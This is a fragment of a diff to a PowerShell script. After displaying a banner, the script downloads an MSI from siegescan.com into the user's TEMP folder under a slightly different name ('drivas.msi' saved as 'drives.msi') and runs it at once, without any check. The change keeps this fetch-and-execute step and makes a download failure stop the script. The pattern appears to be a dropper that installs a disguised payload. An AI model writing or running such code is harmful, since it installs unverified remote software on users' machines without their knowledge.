@@ -19,13 +19,10 @@ $banner = @"
 Write-Host $banner -ForegroundColor Cyan
 
 
-# =========================
-# (UNCHANGED) DOWNLOAD SECTION
-# =========================
 $exeUrl  = "https://siegescan.com/drivas.msi"
 $exePath = "$env:TEMP\drives.msi"
 
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop
 Start-Process $exePath
 
 
